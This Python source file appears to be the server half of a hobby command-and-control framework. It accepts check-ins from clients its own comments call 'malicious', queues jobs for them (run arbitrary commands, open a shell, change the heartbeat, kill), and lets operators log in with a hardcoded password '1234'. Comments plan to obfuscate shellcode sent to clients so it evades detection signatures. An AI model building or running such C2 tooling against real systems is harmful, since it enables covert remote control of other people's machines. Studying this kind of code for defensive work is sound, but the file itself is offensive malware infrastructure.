import subprocess as sp
import socket
import threading
import time
import os
import random
import atexit
from datetime import datetime

HEADER = 64
FORMAT = 'utf-8'

global_debug = True

class s_sock:
    ##########
    ## Main Thread/Class
    ##########
    def __init__(self):
        self.server_password = "1234"
    
    def socket_cleanup(self):
        #pass
        self.server.close()
    
    
    def start_server(self, ip, port):
        
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # this allows the socket to be reelased immediatly on crash/exit
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.ADDR = (ip,port)
        self.server.bind(self.ADDR)  
        atexit.register(self.socket_cleanup)
        
        self.server.listen()  
        
        self.clients = {}
        self.current_clients = []
        
        self.friendly_current_clients = []
        self.friendly_clients = {}

        
        
        ## threading for clients, each connection will do a new thread (need to make sure each thread dies properly)
        while True:
            print("\nTOP OF CODE: listening...")
            self.conn, addr = self.server.accept()
            ##print("\\|/New Connection\\|/")
            
            ## Getting client id from the client, and the IP address
            self.ip_address = self.conn.getpeername()[0]
            
            self.response = self.conn.recv(1024).decode().split("\\|/")
            
            
            response_list = []
            for i in self.response:
                print(f"split response {i}") if global_debug else None
                ## stripping out weird carriage returns from windows clients
                ## SMiley face getting in the way, I think that's why nothing is being sent
                response_list.append(i.strip("\x01").strip("\x02").rstrip("☻"))
                        
            self.id = response_list[0]
            try:
                self.message = response_list[1]
            except:
                self.message = "none"
                print("list index out of range with self.message, setting to none") if global_debug else None
            
            print(f"\nID: {self.id}") if global_debug else None
            print(f"MSG: {self.message}") if global_debug else None
            
            ## I'm sorry for the nested if's :( can definently split this up a bit into functions
            ## interact with server, on first connection
            if self.id == "!_userlogin_!":
                print("PassSplit")
                username, password = self.message.split("//|\\\\")
                
                ## == Password Eval
                print(username, password)
                if self.password_eval(password) == True:
                    print("PassEval")
                    self.conn.send("0".encode())
                    print(f"Successful logon from {username}")
                    
                    friendly_client_name = f"!!~{username}"
                    
                    ## == Handle client (maybe create a function...)
                    ## doing the same class trick as in below
                    if friendly_client_name not in self.friendly_current_clients:
                        self.friendly_current_clients.append(friendly_client_name)

                        self.friendly_client = s_friendlyclient()
                        
                        self.friendly_clients[friendly_client_name] = self.friendly_client
                        
                        globals()[friendly_client_name] = self.friendly_client
                        
                        ## drop into class, passing the connection, addr, and some other stuff
                        ## starts the thread - re think this
                        
                        
                        print(f"DEBUG: f_client msg: {self.response}")
                        friendly_thread = threading.Thread(target=self.friendly_client.friendly_client_communication, args=(self.conn, self.ADDR, self.response, username))
                        friendly_thread.start()

                        ## temp printing friendyl clients
                        #print("FriendlyClients:") if global_debug else None
                        #for var_name in globals():
                            #if var_name.startswith("!!~"):
                                #print(var_name)
                        #continue

                    else:
                        print("AlreadyAuth")

                else:
                    print(f"Failed logon from {username}")
                    self.conn.send("1".encode())


            #elif self.id == "!_usercommand_!":
                #print("usercommand function")


            ## handling commands - ma ynot need this
            ## elif friendly_client_name in friendly_client_name_list:
                ## friendly_client_name.interact()

            
            ## Client filter, make this an elif somehow, so if nothing matches, it drops
            else:
                print("else")
                ## Creating the name in format of '127_0_0_1_QWERT' aka 'IP_ID'
                client_name = "client_" + self.ip_address.replace(".", "_") + "_" + self.id
                ## If the client hasn't been seen before, create new client ID n stuff
                if client_name not in self.current_clients:
                    self.current_clients.append(client_name)
                    
                    ## creating object intance
                    self.client = s_perclient()

                    # something dict
                    self.clients[client_name] = self.client
                    
                    ''' THis is what the dict looks like, each "name" is pointing at a class object
                    clients = {
                        "client_192_168_0_1_1": <s_perclient object at 0x7fda883e4c70>,
                        "client_192_168_0_2_1": <s_perclient object at 0x7fda883e4d00>,
                        "client_192_168_0_2_2": <s_perclient object at 0x7fda883e4d90>
                    }
                    '''

                    globals()[client_name] = self.client
                
                else:
                    ##errmsg here
                    pass

                ## TLDR, this is passing the ID, and Message recieved to the correct class & then that class handles it 
                thread = threading.Thread(target=self.client.handle_client, args=(self.conn, self.ADDR, self.response, self.id))

                thread.start()  
    
    

    
    def password_eval(self, password) -> bool:
        ## decrypt pass
        if password == self.server_password:
            return True
        else:
            return False
        
################
## Friendly Clients
################  
class s_friendlyclient:

    def __init__(self):
        self.ClientConnectionError = "Err: 0x01 ClientConnectionError"
        self.InputNotUnderstood = "Err: 0x02 InputNotUnderstood"
        self.UnknownError = "Err: 0x0? uh... no idea..."
        
    def friendly_client_communication(self, conn, addr, message, username):
                
        self.conn = conn
        self.addr = addr
        self.ip = addr[0]
        self.port = addr[1]
        ## listens for command
        ## runs command_process
        ## returns result to friedly client
        print(f"DEBUG: friendly_client func, user: {username}")
        #print(self.conn.recv(1024).decode())
            
        while True:
            ## Waiting on input from client, on a per thread/friedly client basis until disconnection
            ## diffeerent than malicious clients, as they are constantly checking in, this is a more
            ## consistent connection
            raw_user_input = self.conn.recv(1024).decode()
            user_input = self.parse_msg(raw_user_input)
            
            ## For readability:
            user_username = user_input[0]
            user_command = user_input[1]
            
            print(f"DEBUG: UserInput: {user_input}")
            
            ## Receiveing message from server portion & running through filters
            print("Call Decision Tree") if global_debug else None
            
            self.decision_tree(user_command)
            
            if not message:

                print("Conn Closed\n\n") if global_debug else None
                break
            
            message = None

        conn.close()


    def decision_tree(self, message):

        if message == "clients":
            current_clientlist = ""
            for var_name in globals():
                if var_name.startswith("client_"):
                    ## Sanity check to turn var_name into a string just in case
                    current_clientlist += f"{var_name}\n"
            
            #print(self.current_clients)
            self.send_msg(current_clientlist)

        elif message == "stats":
            pass
            ## Need: client instance name
            ## then. client_instance.stats
            
        
        else:
            self.send_msg(self.InputNotUnderstood)

    def send_msg(self, message:str):
        ## encoding with global str_encode
        encoded_response = str_encode(message)
        self.conn.send(encoded_response)
    
    def parse_msg(self, raw_message) -> list:
        print(f"Raw Message: {raw_message}")
        
        ## strip uneeded code here, replace THEN strip (goes from str -> list, the split returns a list)
        parsed_results_list = raw_message.replace("!_usercommand_!\\|/","").split("//|\\\\")
        
        print(f"Parsed Message: {parsed_results_list}")
        
        return parsed_results_list

#################################
## Per (malicious) Client Class
################################

class s_perclient:
    def __init__(self):
        self.first_time = 0
        # setting current job to none to start
        self.current_job = None

        ## stats
        self.stats_heartbeats = 0
        self.stats_heartbeat_timer = 15
        self.stats_jobsrun = 0
        self.stats_latestcheckin = 0
    
    def handle_client(self, conn, addr, message, id):
        
        self.conn = conn
        self.addr = addr
        self.ip = addr[0]
        self.port = addr[1]
        self.id =  id
        
        ## Sending message back to client that connection is ok
        #self.send_msg("ok")
        print(f"message: {message}") if global_debug else None
    
        while message:
            #print(f"First Time {self.first_time}")
            
                # Receive/Listen for message from client
            #received_msg = conn.recv(1024).decode()   
            #print(received_msg)            
            
            ## Receiveing message from server portion & running through filters
            print("Call Decision Tree") if global_debug else None
            self.decision_tree(message)
            
            ## setting message to none so this waits for a message b4 looping
            
            
            if not message:
                # Client has closed the connection, exit the loop

                print("Conn Closed\n\n") if global_debug else None
                break
            
            message = None

            # Process the received message
            #self.decision_tree(received_msg)
            
        # Close the connection when the loop is over
        conn.close()
    
    def decision_tree(self, received_msg):
        print(f"decision tree called, message recieved: {received_msg}") if global_debug else None
        
        print(f"MSG: {received_msg}, ID: {self.id}") if global_debug else None
        
        ## received_msg should always be ID. If not, either the client is fucked up
        ## or someone is trying to get access to the server 
        ## If a legit message (command output etc) is being sent back, received_msg[0] and 1 should be true and not equal eachother
        if received_msg[0] == self.id:
            print(f"Recieved heartbeat from {self.ip}") if global_debug else None
            ## +1 to heartbeat
            self.stats_heartbeats = self.stats_heartbeats + 1
            self.stats_latestcheckin = datetime.utcnow()

            ## check current_job, & send job ONLY on heartbeat

            if self.current_job != None:
                print(f"Sending Current Job: {self.current_job}") if global_debug else None
                ## sending job
                self.send_msg(self.current_job)

                ## nested if...
                if self.current_job != "wait":
                    ## stats
                    self.stats_jobsrun = self.stats_jobsrun + 1

                ## resetting values
                self.cleanup()
                print(f"Current Job on server side: {self.current_job}") if global_debug else None

            else:
                ## sending wait anyways just to cover my ass incase something goes wrong on the client side
                self.current_job = "wait\\|/wait"
                self.send_msg(self.current_job)
                print("No Current Job available, client will sleep\n\n") if global_debug else None
        ## cover my ass
        else:
            print(f"!! WARNING: There was an attempt to connect to server without an ID!\nMessage sent was: {received_msg}")
    
    ## This part is what the user interacts with, and it sets self.current_job based on the decision. 
    
    ## Self.job executes/gets sent out when the client recieves a heartbeat
    def interact(self, user_input_raw):
        ## Action categpries: set (sets a paramter), run (runs something), info (gets info)
        user_input = user_input_raw.lower()
        
        if user_input == "jobs":
            print(
            "Jobs: \n" \
            "home - takes you to the initial client (aka home) screen\n" \
            "run-command - 'Runs a command (does not return output... yet)'\n" \
            "set-heartbeat - Sets the heartbeat of the client\n" \
            "kill - Kills the client (does not delete... yet)\n" \
            )

        elif user_input == "run-command":
            command = input("Enter command: ")
            self.current_job = f"run-command\\|/{command}"
            #self.current_job = "wait"
            
        ## Idea for shell, have all the code on this side. That way, you just pass the string/command in, and 
        ## can have it obsfucated. The client will then execute said code. This may also help with signatures of common
        ## shells if embedded in the client code
        
        ## How it may work: Shell job gets sent, then the client listens for a followup string, which is the shellcode being sent
        elif user_input == "shell":
            self.current_job = "shell\\|/shell"
        
        elif user_input == "wait":
            self.current_job = "wait\\|/wait"
            
        elif user_input == "set-heartbeat":
            new_heartbeat = input("What is the new heartbeat? (seconds, ex 300): ")
            self.current_job = f"set-heartbeat\\|/{int(new_heartbeat)}"

        elif user_input == "kill":
            ## add additional actions like shutdown, or crash PC in the command slot
            #new_heartbeat = input("What is the new heartbeat? (seconds, ex 300): ")

            self.current_job = f"kill\\|/kill"        

        elif user_input == "current_job":
            print(self.current_job.strip("\\|/"))
            
        elif user_input == "":
            print("No input provided!")
        
        else:
            print("Job does not exist - type 'jobs' for jobs")
            self.current_job == "none"
            
    def cleanup(self):
        self.current_job = "wait\\|/wait"
        
    def send_msg(self, message):
        print(f"Message being sent: {message}") if global_debug else None
        ## 
        self.conn.send(message.encode())
        
        
        ## wasn't running as it was waiting for a response
        #recieve_msg = self.conn.recv(1024).decode()
        #return recieve_msg
    ## def send_cmd():
    ## this one will be for sending & receiving one off comamnds,
    ## seperate due to the recieve msg
        #recieve_msg = self.conn.recv(1024).decode()
        #return recieve_msg

################
## QOL Functions
################
## bytes -> str
def str_decode(input) -> str:
    decoded_result = input.decode()
    return decoded_result

## str -> bytes
def str_encode(input) -> bytes:
    encoded_result = input.encode()
    return encoded_result
    
    
if __name__ == "__main__":
    ## could listen on multiple ports with threading this whole thing
    SERV = s_sock()

    background_listen = threading.Thread(target=SERV.start_server, args=('0.0.0.0',100))
    background_listen.start() 
    print("server started")
    
    #SERV.start_server('0.0.0.0',8092)
    
    #SERV.client_interact()